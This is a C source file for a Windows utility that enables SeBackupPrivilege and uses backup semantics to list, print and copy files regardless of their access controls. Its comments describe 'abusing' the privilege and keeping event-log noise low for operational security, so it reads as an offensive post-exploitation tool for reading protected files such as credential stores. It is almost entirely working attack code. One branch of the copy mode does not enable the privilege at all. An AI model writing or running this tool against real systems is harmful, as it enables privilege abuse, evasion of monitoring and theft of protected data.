#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void enablePriv(){
    HANDLE hCurrentToken;
    TOKEN_PRIVILEGES tpSeBackup = {0};
    LUID lSeBackup;


    if (!(     OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hCurrentToken) )){
        printf("[-] Failed to open the current token\nError code : %d\n", GetLastError()); 
        fflush(stdout);

    } else { 
        printf("[+] Successfully opened token \n"); 
        fflush(stdout);
    }
    LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &lSeBackup);
    tpSeBackup.PrivilegeCount = 1;
    tpSeBackup.Privileges[0].Luid = lSeBackup;
    tpSeBackup.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


    if (!(     AdjustTokenPrivileges(hCurrentToken, FALSE, &tpSeBackup, 0, NULL, NULL) )){
        printf("[-] Failed to enable SeBackupPrivilege \nError code : %d\n", GetLastError()); 
        fflush(stdout);

    } else { 
        printf("[+] Successfully enabled SeBackupPrivilege \n"); 
        fflush(stdout);
    }
        CloseHandle(hCurrentToken);
}

void listFiles(char path[]){ // Must add /* to path (?)
    printf("Listing files in directory %s\n", path);
    fflush(stdout);
    WIN32_FIND_DATA wfdFindings;
    HANDLE hFind = FindFirstFile(path, &wfdFindings);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open directory: %d\n", GetLastError());
        return;
    }
    do {
        if (wfdFindings.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
            printf("%s  < IS A DIRECTORY > \n", wfdFindings.cFileName);
            fflush(stdout);
        } else { printf("%s\n", wfdFindings.cFileName); }
        

    } while (FindNextFile(hFind, &wfdFindings));

    printf("=== End of directory listing ===\n");
    fflush(stdout);
    FindClose(hFind);

}

void copyFile(char source[], char destination[]) {
    printf("[*] Copying %s -> %s\n", source, destination);
    
    HANDLE hSource = CreateFile(source, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hSource == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open source: %d\n", GetLastError());
        return;
    }
    printf("[+] Source opened successfully\n");
    
    HANDLE hDest = CreateFile(destination, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDest == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create destination: %d\n", GetLastError());
        CloseHandle(hSource);
        return;
    }
    printf("[+] Destination created successfully\n");
    
    char BUFFER[8192];
    DWORD bytesRead;
    DWORD totalBytes = 0;
    
    while (1) {
        if (!ReadFile(hSource, BUFFER, sizeof(BUFFER), &bytesRead, NULL)) {
            printf("[-] Read failed at byte %lu: %d\n", totalBytes, GetLastError());
            break;
        }
        if (bytesRead == 0) break;
        
        DWORD bytesWritten;
        if (!WriteFile(hDest, BUFFER, bytesRead, &bytesWritten, NULL)) {
            printf("[-] Write failed: %d\n", GetLastError());
            break;
        }
        totalBytes += bytesWritten;
        printf("[+] Copied %lu bytes (total: %lu)\r", bytesRead, totalBytes);
    }
    
    printf("\n[+] Copy complete: %lu total bytes\n", totalBytes);
    CloseHandle(hSource);
    CloseHandle(hDest);
}

void catspecificFile(char path[]) {
    //cat command replacement but abusing seBackupPrivilege
    //Apparently some of the first bytes will be UTF16 garbage anyways...  ?
    char BUFFER[1024];
    ZeroMemory(BUFFER, sizeof(BUFFER));
    DWORD bytesRead = 0;

    HANDLE hFile = CreateFile(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL); // this triggers events on the event manager (FILE_FLAG_BACKUP_SEMANTINCS) so watch out to not make too much noise if OPSEC is a priority
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to read file: %d\n", GetLastError());
        return;
    }

    do {
        
    if (ReadFile(hFile, BUFFER, sizeof(BUFFER) - 1, &bytesRead, NULL)) {
        BUFFER[bytesRead] = '\0';
        fwrite(BUFFER, 1, bytesRead, stdout);
        ZeroMemory(BUFFER, sizeof(BUFFER));

    } else { printf("Read Failed.\n  -> Error Code : %d\n", GetLastError()); CloseHandle(hFile); break; }

    } while (bytesRead > 0);

    CloseHandle(hFile);

}


int main(int argc, char * argv[]) {
    if (argc == 1 ) {
        printf("Enter an option !\n");
        return 0;
    }
    if (strcmp(argv[1], "ls") == 0) {
        enablePriv();
        char searchPath[MAX_PATH];
        snprintf(searchPath, sizeof(searchPath), "%s\\*", argv[2]);
        listFiles(searchPath);
    } else if (strcmp(argv[1], "cat") == 0) {
        enablePriv();
        catspecificFile(argv[2]);
    } else if (strcmp(argv[1], "cp") == 0) {
    if (argc < 4) {
        enablePriv();
        // If no destination provided, create one in current directory
        char defaultDest[MAX_PATH];
        char *filename = strrchr(argv[2], '\\');
        if (filename == NULL) filename = argv[2];
        else filename++; // Skip the backslash
        
        snprintf(defaultDest, sizeof(defaultDest), ".\\%s", filename);
        copyFile(argv[2], defaultDest);
    } else { copyFile(argv[2], argv[3]); }
    } else { printf("Please enter a valid option.\n"); return 0;}

}
